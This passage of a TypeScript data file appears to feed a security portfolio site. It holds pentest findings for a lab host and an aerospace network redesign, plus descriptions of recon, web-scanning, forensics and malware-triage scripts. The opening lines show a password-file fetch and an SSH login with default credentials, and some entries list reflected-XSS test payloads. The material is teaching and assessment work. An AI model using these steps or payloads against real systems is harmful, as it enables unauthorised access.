curl http://192.168.100.29/passwd_exfil.txt
# Reveals all user accounts including: vagrant:x:1000:...

# Chain 1 — Step 2: SSH with default credentials
ssh vagrant@192.168.100.29  # Password: vagrant
# Immediate shell access`,
      },
      {
        id: "r7-f4",
        title: "Plaintext Passwords in Payroll Database — 15 Employee Records (CVSS 9.1)",
        severity: "critical",
        cvss: "9.1",
        affected: "MySQL payroll database — employees table",
        body: "Post-exploitation database access revealed the payroll application stored employee passwords as plaintext strings in the MySQL employees table. Fifteen records were extracted containing first name, last name, job role, salary, and plaintext password. The same passwords were present in /etc/shadow (MD5 hashed) — confirming password reuse between the application and the OS.",
        impact: "Exposure of 15 employees' complete PII including salary data and plaintext passwords constitutes a reportable data breach under applicable data protection legislation. Password reuse between the payroll application and OS accounts means these credentials can be used to authenticate to other internal systems. The report cites GDPR, Kenya Data Protection Act 2019, and CCPA as applicable frameworks.",
        remediation: "Hash all application passwords using bcrypt, Argon2, or PBKDF2 with a per-user salt — never store plaintext or MD5-hashed passwords. Rotate all exposed credentials immediately. Conduct a full audit for password reuse across other internal systems. Implement a data breach notification procedure if regulatory obligations apply.",
      },
    ],
  },
  {
    id: "r8",
    title: "Acme AeroTech Network Redesign — Defense-in-Depth Architecture",
    type: "network",
    teaser: "A global aerospace manufacturer's transition from a flat, high-risk legacy network to a segmented, hardened defense-in-depth architecture. 8 VLAN zones, MFA integration, and inline IDS/IPS to block lateral movement.",
    target: "Acme AeroTech — Global Aerospace Manufacturing Infrastructure",
    scope: "Enterprise-wide network redesign: vulnerability analysis, risk prioritization, multi-zone VLAN design, and security control implementation across 8 distinct trust zones.",
    purpose: "Transform a legacy flat network into a modern, resilient architecture that enforces strict access control, provides deep threat visibility, and eliminates single points of failure across critical manufacturing and corporate segments.",
    why: "The original environment was a flat Layer-2 network with no internal boundaries. Public-facing services (FTP, Web) sat on the same LAN as sensitive manufacturing databases, protocols were largely cleartext, and a total lack of monitoring made detection of lateral movement impossible. Any single compromise threatened the entire global infrastructure.",
    methodology: [
      "Phase 1 — Audit & Discovery: performed comprehensive vulnerability analysis of legacy infrastructure. Identified critical exposures in cleartext protocols, unpatched systems, and wide-open internal access patterns.",
      "Phase 2 — Risk Prioritization: mapped discovered vulnerabilities to business impact. Prioritized lateral movement and cleartext data exposure as the highest risks to manufacturing continuity.",
      "Phase 3 — Zone Design: architected 8 distinct VLAN zones based on trust levels and functional requirements. Defined default-deny ACLs for all inter-zone traffic, moving all public-facing services to a dedicated DMZ.",
      "Phase 4 — Control Implementation: deployed defense-in-depth controls including Firewall HA pairs, 802.1X NAC, WPA3-Enterprise, and inline IDS/IPS for real-time threat visibility.",
      "Phase 5 — Resilience & Monitoring: implemented 3-2-1 backup strategy with encrypted database replicas and integrated a centralized SIEM/EDR stack for comprehensive audit trails.",
    ],
    tools: ["Nessus", "pfSense HA", "Suricata IDS/IPS", "RADIUS", "802.1X", "Wazuh SIEM", "EDR/XDR", "WSUS"],
    timeline: "Redesign and Phased Implementation — Q1 2026",
    outcome: "Eliminated the flat network risk through 8-zone segmentation. Successfully replaced cleartext FTP with SFTP and enforced HTTPS-only for web services. Achieved high availability with redundant core switching and firewall failover. Established full threat visibility across the environment, reducing the mean-time-to-detection for lateral movement from 'unknown' to real-time.",
    lessonsLearned: [
      "Segmentation is the most effective control against ransomware: by isolating manufacturing zones from corporate zones, the blast radius of a single workstation compromise is contained.",
      "Availability and Security must be balanced: a highly secure network that is a single point of failure is a business risk. Redundancy (HA/LACP) is as critical as the firewall rules themselves.",
      "Visibility is a prerequisite for defense: you cannot defend what you cannot see. Centralized logging and inline IDS/IPS turned a blind infrastructure into an observable one.",
      "Legacy protocol debt (FTP/Telnet) is a massive liability: the transition to SFTP and SSH wasn't just a technical change but a critical risk reduction for credential protection.",
      "Zero Trust principles start at the access layer: implementing 802.1X NAC ensures that unauthorized physical devices cannot simply plug into a wall jack and join the internal network.",
    ],
    findings: [
      {
        id: "r8-f1",
        title: "F-01: Flat Layer-2 Network Architecture",
        severity: "critical",
        cvss: "9.8",
        affected: "Global enterprise infrastructure",
        body: "The legacy network operated as a single large broadcast domain. There was no internal segmentation between employee workstations, manufacturing databases, and internet-facing servers. This architecture allowed unrestricted lateral movement; once an attacker gained a foothold on any endpoint, they had a direct network path to every other host in the company.",
        impact: "High risk of total environment compromise. A single ransomware infection or compromised credential could spread across the entire infrastructure in minutes with no network-level controls to slow it down.",
        remediation: "Implement 8-zone VLAN segmentation with default-deny ACLs. Enforce strict traffic filtering at the zone boundaries so that only explicitly permitted services can communicate across segments.",
      },
      {
        id: "r8-f2",
        title: "F-02: Public-Facing Services on Internal LAN",
        severity: "high",
        cvss: "8.5",
        affected: "Web servers, SFTP/FTP servers, Mail servers",
        body: "Services intended for internet access were hosted directly on the same network segment as internal corporate assets. A compromise of the web server provided an attacker with immediate, unfettered access to the internal LAN, effectively bypassing the perimeter firewall's intent.",
        impact: "The perimeter firewall provided no protection against lateral movement following a web-app compromise. This topology is a primary enabler of data exfiltration and internal infrastructure targeting.",
        remediation: "Deploy a dedicated DMZ (Demilitarized Zone). Isolate all internet-facing services within the DMZ and implement restrictive firewall rules that prevent any inbound connections from the DMZ to the internal LAN.",
      },
      {
        id: "r8-f3",
        title: "F-03: Use of Cleartext Protocols (FTP, Telnet, HTTP)",
        severity: "high",
        cvss: "7.5",
        affected: "Management traffic and data transfers",
        body: "Administrative access and large-scale data transfers relied on unencrypted protocols. User credentials and sensitive technical data were transmitted across the wire in plaintext, visible to any attacker with a basic network sniffer on the same segment.",
        impact: "Trivial credential theft via sniffing. An attacker inside the network could capture administrative passwords and use them to escalate privileges and gain full control over servers and network equipment.",
        remediation: "Decommission FTP and Telnet. Mandate the use of SFTP/SSH for all transfers and administration. Enforce HTTPS-only policies for all web-based management interfaces.",
      },
      {
        id: "r8-f4",
        title: "F-04: Lack of Threat Visibility and Monitoring",
        severity: "medium",
        cvss: "6.0",
        affected: "Network-wide detection capability",
        body: "The infrastructure lacked centralized logging, IDS/IPS, or EDR. Security events occurred in isolation on individual hosts with no central correlation. This created a 'silent' network where an attacker could operate for weeks or months without triggering any alerts.",
        impact: "Delayed detection of breaches. Without an audit trail or real-time alerts, incident response is purely reactive and often begins only after significant damage (like data encryption or exfiltration) has already occurred.",
        remediation: "Implement a centralized SIEM stack (Wazuh/ELK) integrated with inline Suricata IDS/IPS. Deploy EDR/XDR across all endpoints to provide unified visibility and automated response capabilities.",
      },
      {
        id: "r8-f5",
        title: "F-05: Single Point of Failure in Core Networking",
        severity: "medium",
        cvss: "5.5",
        affected: "Network availability and resilience",
        body: "The core network relied on single, non-redundant firewall and switching hardware. A hardware failure at the core would result in a total company-wide outage, as there was no automated failover or path redundancy in place.",
        impact: "High risk to business continuity. Even a non-malicious hardware failure could shut down manufacturing and corporate operations for hours or days while waiting for manual intervention or replacement parts.",
        remediation: "Deploy firewalls in High Availability (HA) pairs with stateful failover. Implement redundant Layer-3 core switches using LACP and spanning-tree optimizations to ensure no single hardware failure can cause a total outage.",
      },
    ],
    networkDiagramUrl: "/projects_docs/ACME.drawio%20(2).png",
  },
];

export const scripts: SecurityScript[] = [
  {
    id: "port-scanner",
    title: "Multi-Threaded Port Scanner",
    category: "recon",
    shortDescription: "Fast TCP port scanner with banner grabbing, service detection, and configurable thread count — built with Python's ThreadPoolExecutor.",
    purpose: "Scan a target host for open TCP ports, identify services running on each port, and attempt to grab service banners — all in parallel using a thread pool.",
    why: "Understanding what ports and services are exposed on a network is the first step in any security assessment. Building this script from scratch teaches how port scanning works under the hood, rather than just running Nmap as a black box.",
    how: "Uses Python's socket library to attempt TCP connections on each port. A ThreadPoolExecutor runs scans in parallel. For open ports it sends a probe string and reads the first 1024 bytes as a service banner. Results are printed in a formatted table.",
    tech: ["Python", "socket", "ThreadPoolExecutor", "argparse"],
    language: "python",
    difficulty: "intermediate",
    filename: "port_scanner.py",
    code: "",
    setupSteps: [
      "Install Python 3.8+ — no third-party packages required.",
      "Download port_scanner.py to your working directory.",
      "Only scan hosts you own or have explicit permission to test.",
    ],
    usageExample: `python port_scanner.py 192.168.1.1
python port_scanner.py 192.168.1.1 -p 1-65535 -t 100 --timeout 2.0
python port_scanner.py scanme.nmap.org -p 80`,
    replicationSteps: [
      "Set up a local Linux VM as the scan target.",
      "Start services on the VM: sudo systemctl start ssh apache2",
      "Run: python port_scanner.py <vm-ip> -p 1-1024",
      "Verify open ports match services. Compare with: nmap -sV <vm-ip>",
    ],
    lessonsLearned: [
      "ThreadPoolExecutor reduces scan time dramatically — 1024 ports in under 3 seconds vs 60+ sequentially.",
      "Banner grabbing is unreliable: many services don't respond to a generic probe. Real scanners use service-specific payloads.",
      "TCP connect scanning completes the three-way handshake — it is noisy and easily logged by firewalls and IDS.",
    ],
    tags: ["port-scan", "network-recon", "tcp", "banner-grabbing", "multithreading"],
  },
  {
    id: "web-security-scanner",
    title: "Web Security Scanner",
    category: "analysis",
    shortDescription: "Audits a web target for missing security headers and tests common query parameters for reflected XSS with a curated payload list.",
    purpose: "Perform a basic automated web security audit — checking for critical HTTP security headers and testing for reflected XSS in common query parameters.",
    why: "Security headers and reflected XSS are two of the most common and easiest-to-find web vulnerabilities. Building this scanner teaches what automated tools do under the hood and what to look for during a web application pentest.",
    how: "Sends an HTTP GET request to the target and inspects response headers against six critical security header names. Then tests common parameters (q, s, id, search) with eight XSS payloads and checks if the raw payload appears unencoded in the HTML response.",
    tech: ["Python", "requests", "argparse", "HTTP headers", "XSS payloads"],
    language: "python",
    difficulty: "intermediate",
    filename: "web_scanner.py",
    code: "",
    setupSteps: [
      "Install dependencies: pip install requests",
      "Only run against targets you own or intentionally vulnerable apps like DVWA or bWAPP.",
    ],
    usageExample: `python web_scanner.py http://192.168.1.100
python web_scanner.py http://testphp.vulnweb.com`,
    replicationSteps: [
      "Set up DVWA locally: docker run -p 80:80 vulnerables/web-dvwa",
      "Run: python web_scanner.py http://localhost",
      "Check the header audit — DVWA deliberately lacks several security headers.",
      "Test the XSS scan against DVWA's Reflected XSS page with security set to Low.",
    ],
    lessonsLearned: [
      "Payload reflection in source does not guarantee execution — the browser's CSP or XSS protections may block it.",
      "Security headers must be set at the load-balancer level to prevent subdomain gaps when deploying new services.",
      "Many modern frameworks auto-add security headers; missing Content-Security-Policy is now a stronger finding than before.",
    ],
    tags: ["xss", "security-headers", "web-scan", "owasp", "csp", "reflected-xss"],
  },
  {
    id: "osint-recon",
    title: "OSINT Domain Recon",
    category: "recon",
    shortDescription: "Automates WHOIS lookups and Shodan host intelligence for a target domain and saves results to JSON.",
    purpose: "Collect passive OSINT about a domain — registration details via WHOIS and exposed network infrastructure via Shodan — without sending any packets directly to the target.",
    why: "Passive reconnaissance is always the first step in a pentest or threat-intelligence workflow. Understanding target exposure before active scanning helps prioritise effort and avoids triggering intrusion detection.",
    how: "Prompts for a domain, queries WHOIS via python-whois, resolves the domain to an IP via the Shodan DNS API, then retrieves the full Shodan host record. All data is saved to osint_results.json for analysis.",
    tech: ["Python", "python-whois", "Shodan API", "requests", "json"],
    language: "python",
    difficulty: "beginner",
    filename: "OSINT_final.py",
    code: "",
    setupSteps: [
      "Install dependencies: pip install python-whois requests",
      "Get a free Shodan API key at https://account.shodan.io and replace the placeholder in the script.",
      "Run: python OSINT_final.py and enter a domain when prompted.",
    ],
    usageExample: `python OSINT_final.py
# Enter domain: example.com
# Results saved to osint_results.json`,
    replicationSteps: [
      "Sign up for a free Shodan account and copy your API key.",
      "Set your key in the script: SHODAN_API_KEY = 'your_actual_key'",
      "Run against a domain you own or a bug-bounty target that allows OSINT.",
      "Review osint_results.json for registered org, name servers, and exposed ports.",
    ],
    lessonsLearned: [
      "WHOIS data is increasingly redacted under GDPR for privacy-proxy registrations — this is expected, not a script failure.",
      "Shodan's free tier is rate-limited and may lack data for every IP — results depend on Shodan's last scan of the target.",
      "Saving results to JSON immediately is good practice — OSINT data changes quickly and you need a timestamped snapshot.",
    ],
    tags: ["osint", "whois", "shodan", "recon", "passive-recon", "domain-intel"],
  },
  {
    id: "forensic-carver",
    title: "Digital Forensics File Carver",
    category: "analysis",
    shortDescription: "Recovers deleted JPEG, PNG, PDF, and GIF files from raw disk images using file signature (magic byte) matching with MD5 chain-of-custody logging.",
    purpose: "Scan a binary disk image for known file headers and footers, carve out complete files, verify their integrity, compute MD5 hashes for evidence logging, and write a hashes.txt chain-of-custody report.",
    why: "File carving is a core digital forensics skill. When a file is deleted its directory entry is removed but the data often remains on disk. Understanding how carvers work is essential for any DFIR role.",
    how: "Reads the entire disk image into memory, then searches for each file type's magic bytes. For each header found it locates the matching footer, extracts the byte range, validates structure, writes the file to an output directory, and logs the MD5 hash.",
    tech: ["Python", "hashlib", "binary analysis", "file signatures", "MD5"],
    language: "python",
    difficulty: "advanced",
    filename: "forensic_carver.py",
    code: "",
    setupSteps: [
      "Install Python 3.8+ — no third-party packages required.",
      "Obtain or create a test disk image. 'dd' on Linux can create one from a USB drive.",
      "Run: python forensic_carver.py",
    ],
    usageExample: `python forensic_carver.py
# Carves files into output directory named after last_name variable
# Generates hashes.txt with MD5 log for chain of custody`,
    replicationSteps: [
      "Create a test image: copy mixed images/PDFs to a FAT32 USB, then dd if=/dev/sdX of=test.img",
      "Delete some files from the USB without wiping, then recreate the image.",
      "Run the carver and verify it recovers the deleted files.",
      "Cross-check MD5 hashes with known-good values to confirm integrity.",
    ],
    lessonsLearned: [
      "Files do not disappear when deleted — they lose their directory pointer but the data remains until overwritten.",
      "False positives are common: JPEG headers appear inside other formats. Header+footer integrity checks filter most of them.",
      "A 50 MB carve limit per file prevents runaway extraction when a footer is missing — critical for corrupted disk images.",
      "MD5 is the standard forensic chain-of-custody hash but should be paired with SHA-256 for adversarial contexts.",
    ],
    tags: ["digital-forensics", "file-carving", "md5", "disk-image", "evidence-recovery", "dfir"],
  },
  {
    id: "malware-analyser",
    title: "Static Malware Analyser",
    category: "analysis",
    shortDescription: "Performs static analysis on a binary — hex disassembly, obfuscation pattern detection, and embedded payload marker scanning.",
    purpose: "Analyse a suspicious binary without executing it — extract pseudo-disassembled instructions from the hex representation, flag patterns associated with obfuscated shellcode, and detect embedded payload markers.",
    why: "Static analysis is the safe first step for any suspected malware. You learn about the file contents without running it and risking infection. This script teaches the fundamentals: hex inspection, pattern matching, and structured reporting.",
    how: "Reads the binary file, converts to a hex string, splits into 4-byte chunks labelled INSTR_XXXXXXXX. A regex flags instructions of all zeros (common padding/obfuscation). Also scans raw bytes for a PAYLOAD marker byte sequence.",
    tech: ["Python", "binascii", "regex", "hex analysis"],
    language: "python",
    difficulty: "intermediate",
    filename: "malware_final.py",
    code: "",
    setupSteps: [
      "Install Python 3.8+ — no third-party packages required.",
      "Obtain a sample binary for testing — any non-sensitive compiled binary works.",
      "Run: python malware_final.py and enter the path when prompted.",
    ],
    usageExample: `python malware_final.py
# Enter path: /samples/suspicious.exe
# Output: disassembled instructions, obfuscation flags, payload detection`,
    replicationSteps: [
      "Create a test binary with known patterns using Python: open('test.bin','wb').write(b'\\x00'*8 + b'PAYLOAD' + b'\\xff'*8)",
      "Run the analyser against test.bin — it should flag zero padding and detect the PAYLOAD marker.",
      "Try against a benign binary (hello-world C program) to see what normal output looks like.",
    ],
    lessonsLearned: [
      "This is a toy disassembler — real malware analysis requires Ghidra, IDA Pro, or Radare2 which understand CPU instruction sets.",
      "The PAYLOAD marker is a deliberate lab exercise — real malware uses encrypted or encoded payloads with no readable markers.",
      "Static analysis must always be paired with dynamic sandboxing for definitive conclusions about malicious behaviour.",
    ],
    tags: ["malware-analysis", "static-analysis", "binary", "obfuscation-detection", "hex"],
  },
  {
    id: "finsecure-audit",
    title: "FinSecure Compliance Auditor",
    category: "analysis",
    shortDescription: "Checks three compliance controls: sensitive directory permissions, active user session count, and disk space utilisation threshold.",
    purpose: "Automate a basic compliance check — verify sensitive directories are not world-readable, active session count is within policy limits, and disk usage is below the 80% warning threshold.",
    why: "Compliance audits repeat the same checks every cycle. Automating them saves time and ensures consistency. This script demonstrates lightweight audit automation a SOC analyst or sysadmin might run as a scheduled task.",
    how: "Uses os.stat() to check POSIX permissions on the directory from FINSECURE_SENSITIVE_DIR env var, subprocess to run 'query user'/'who' for session count, and shutil.disk_usage() for disk utilisation percentage.",
    tech: ["Python", "os", "stat", "subprocess", "shutil"],
    language: "python",
    difficulty: "beginner",
    filename: "finsecure.py",
    code: "",
    setupSteps: [
      "Install Python 3.8+ — no third-party packages required.",
      "Optionally set FINSECURE_SENSITIVE_DIR to the path you want audited.",
      "Run: python finsecure.py",
    ],
    usageExample: `python finsecure.py

# Linux/Mac with custom directory:
FINSECURE_SENSITIVE_DIR=/var/sensitive python finsecure.py

# Windows PowerShell:
$env:FINSECURE_SENSITIVE_DIR = "C:\\secure_data"; python finsecure.py`,
    replicationSteps: [
      "Linux: mkdir /tmp/test_secure && chmod 755 /tmp/test_secure",
      "Set: export FINSECURE_SENSITIVE_DIR=/tmp/test_secure then run — should flag as non-compliant (group-readable).",
      "Fix: chmod 700 /tmp/test_secure then re-run — should now pass.",
      "Open several terminal sessions to verify the session count logic triggers correctly.",
    ],
    lessonsLearned: [
      "Reading the sensitive directory from an environment variable rather than hardcoding it makes the script portable and follows the 12-factor app principle.",
      "Windows uses ACLs instead of POSIX permission bits — os.stat() checks need a platform branch for cross-platform scripts.",
      "Compliance scripts should produce machine-readable output (exit codes, JSON) for SIEM or CI pipeline integration.",
    ],
    tags: ["compliance", "audit", "file-permissions", "disk-space", "session-monitoring"],
  },
  {
    id: "network-test-lab",
    title: "Network Diagnostics Lab",
    category: "recon",
    shortDescription: "Enumerates local IPs, tests ICMP connectivity, resolves DNS, and lists all listening TCP/UDP ports with owning process names.",
    purpose: "Provide a quick network health snapshot: what IPs are bound, which hosts are reachable, whether DNS resolves, and what processes are listening on the network.",
    why: "Knowing your own network footprint is as important as knowing an attacker's. This is the kind of tool you run at the start of an incident response to quickly understand the baseline state of a machine.",
    how: "Uses socket.getaddrinfo() for local IP enumeration, subprocess for OS ping, socket again for DNS resolution, and psutil.net_connections() to enumerate listening ports — enriched with process names from psutil.Process().",
    tech: ["Python", "psutil", "socket", "subprocess", "platform"],
    language: "python",
    difficulty: "intermediate",
    filename: "network_test_lab.py",
    code: "",
    setupSteps: [
      "Install Python 3.8+ and psutil: pip install psutil",
      "Run with administrator privileges (Windows: Run as Administrator / Linux: sudo).",
      "Run: python network_test_lab.py",
    ],
    usageExample: `# Windows (admin PowerShell)
python network_test_lab.py

# Linux/Mac (sudo)
sudo python3 network_test_lab.py

# Output: LOCAL IPs / PING TEST / DNS RESOLUTION / LISTENING PORTS`,
    replicationSteps: [
      "Install psutil: pip install psutil",
      "Run with admin rights and note listening ports.",
      "In another terminal start a test server: python3 -m http.server 9000",
      "Re-run and verify port 9000 now appears under TCP listeners.",
    ],
    lessonsLearned: [
      "psutil abstracts OS-level socket enumeration cleanly — without it you'd parse 'netstat -an' output which varies across platforms.",
      "Requiring admin rights for process-level port info is intentional — unprivileged users can list ports but not the owning process name.",
      "DNS resolution failure (socket.gaierror) is one of the most common networking issues; a clear error message beats a raw traceback.",
    ],
    tags: ["network-diagnostics", "ping", "dns", "listening-ports", "psutil", "incident-response"],
  },
  {
    id: "mobile-security-audit",
    title: "Android ADB Security Audit",
    category: "analysis",
    shortDescription: "Uses Android Debug Bridge (ADB) to check for root access, enumerate installed apps, and list open network ports on a connected Android device.",
    purpose: "Perform a quick security audit of a connected Android device via ADB — detecting root access, reviewing installed apps, and identifying open ports that may expose attack surface.",
    why: "Mobile device security is often overlooked in enterprise environments. Rooted devices bypass Android's security model. This script shows how to automate basic mobile security checks as part of a BYOD policy audit.",
    how: "Uses subprocess to invoke ADB commands. Checks for root via 'su -c id' and looks for uid=0. Retrieves package data via 'dumpsys package'. Lists open connections via 'netstat' on the device shell.",
    tech: ["Python", "ADB", "subprocess", "Android"],
    language: "python",
    difficulty: "intermediate",
    filename: "mobile_final.py",
    code: "",
    setupSteps: [
      "Install Android SDK Platform Tools (includes ADB): https://developer.android.com/studio/releases/platform-tools",
      "Enable USB Debugging: Settings → Developer Options → USB Debugging.",
      "Connect device via USB and confirm with: adb devices",
      "Run: python mobile_final.py",
    ],
    usageExample: `python mobile_final.py
# Menu: 1=root check, 2=app check, 3=open ports, 4=all
Enter your choice (1-4): 4`,
    replicationSteps: [
      "Enable USB debugging on an Android phone or Android Studio emulator.",
      "Confirm with: adb devices — should show as 'device' not 'unauthorized'.",
      "Run and choose option 4 for all checks.",
      "Try on a rooted emulator to verify root detection triggers correctly.",
    ],
    lessonsLearned: [
      "ADB gives significant device access — USB debugging should be disabled on all non-development enterprise devices.",
      "Android netstat output format varies by version — parsing it reliably requires handling multiple output layouts.",
      "Root detection via 'su -c id' can be bypassed by root-hiding tools like Magisk Hide — production MDM uses deeper kernel-level checks.",
    ],
    tags: ["android", "adb", "mobile-security", "root-detection", "open-ports", "mdm"],
  },
  {
    id: "xss-scanner",
    title: "Reflected XSS Tester",
    category: "analysis",
    shortDescription: "Tests a web application's search endpoint for reflected XSS by injecting three common payloads and checking if they appear unescaped in the response.",
    purpose: "Verify whether a web application's query parameters reflect user input without sanitisation — the most basic form of Cross-Site Scripting vulnerability testing.",
    why: "Reflected XSS remains one of the most prevalent web vulnerabilities (OWASP Top 10 A03:2021). Understanding payload reflection testing is foundational to both offensive security and code review for defence.",
    how: "Constructs GET requests with each XSS payload appended to the BASE_URL query string, then checks if the raw payload string appears in the response body. Reflection without HTML encoding is a potential XSS sink.",
    tech: ["Python", "requests", "HTTP", "XSS payloads"],
    language: "python",
    difficulty: "beginner",
    filename: "vuln_scanner.py",
    code: "",
    setupSteps: [
      "Install dependencies: pip install requests",
      "Set up a vulnerable test target — DVWA, bWAPP, or a simple Flask echo app.",
      "Edit BASE_URL in the script to point to your test endpoint.",
      "Run: python vuln_scanner.py",
    ],
    usageExample: `python vuln_scanner.py
# [!] XSS reflected: <script>alert(1)</script>
# [!] XSS reflected: <img src=x onerror=alert(2)>
# [ok] No reflection: <svg/onload=alert(3)>`,
    replicationSteps: [
      "Create a minimal Flask echo app: from flask import Flask, request; app=Flask(__name__); @app.route('/search')\ndef s(): return request.args.get('q','')",
      "Run: flask run --port 5000",
      "Run the scanner — all three payloads should be flagged as reflected.",
      "Add output escaping with markupsafe.escape() and re-run to confirm no reflection.",
    ],
    lessonsLearned: [
      "Payload reflection in source does not guarantee execution — the browser's CSP may block it. Always verify in a real browser.",
      "This scanner checks one endpoint. A real scanner iterates all parameters across all discovered pages.",
      "Only run against systems you own or have written authorisation for — automated GET requests can constitute unauthorised access.",
    ],
    tags: ["xss", "vulnerability-scanning", "reflected-xss", "web-security", "owasp"],
  },
  {
    id: "pdf-analyser",
    title: "Suspicious PDF Analyser",
    category: "analysis",
    shortDescription: "Extracts readable strings, computes MD5/SHA-256 hashes, and scans a PDF file for suspicious keywords like 'javascript', 'action', and 'submit'.",
    purpose: "Perform lightweight static analysis on a PDF file to surface potential malicious indicators — without opening it. Useful for initial triage of suspicious email attachments.",
    why: "PDFs are a common malware delivery vector. They can embed JavaScript, auto-submit forms, or exploit reader vulnerabilities. Static byte analysis lets you triage safely before deciding whether to sandbox the file.",
    how: "Reads the PDF as raw bytes, extracts all printable ASCII strings of 4+ characters via regex, computes MD5 and SHA-256 hashes for threat-intel lookups, then cross-references strings against suspicious keywords associated with PDF-based attacks.",
    tech: ["Python", "hashlib", "regex", "os", "binary string extraction"],
    language: "python",
    difficulty: "beginner",
    filename: "pdf_analysis.py",
    code: "",
    setupSteps: [
      "Install Python 3.8+ — no third-party packages required.",
      "Place the PDF to analyse in the same directory as the script (or edit the file_path variable).",
      "Run: python pdf_analysis.py",
    ],
    usageExample: `python pdf_analysis.py
# Analysis Report for: suspicious.pdf
# MD5:    d41d8cd98f00b204e9800998ecf8427e
# SHA-256: e3b0c44298fc1c149afb...
# Suspicious Indicators Found:
# /JavaScript  << /Action endobj`,
    replicationSteps: [
      "Download a benign PDF as a baseline — the analyser should report no suspicious indicators.",
      "In a sandboxed VM, download a PDF malware sample from a threat-intel repo (MalShare, ANY.RUN).",
      "Run the analyser against both and compare the output.",
      "Search the MD5/SHA-256 hashes on VirusTotal to check for known-bad classifications.",
    ],
    lessonsLearned: [
      "Raw string extraction produces noise — the 4-character minimum filter reduces but does not eliminate false positives.",
      "Hash lookup on VirusTotal is the most efficient first step — if the hash is known-bad, deeper analysis may be unnecessary.",
      "Real PDF forensics tools (peepdf, pdfid, pdf-parser) parse the PDF object tree — far more accurate than raw string scanning.",
    ],
    tags: ["pdf-forensics", "static-analysis", "malware-triage", "hash-analysis", "dfir"],
  },
];
export const cvVariants = {
  cyber: "",
};
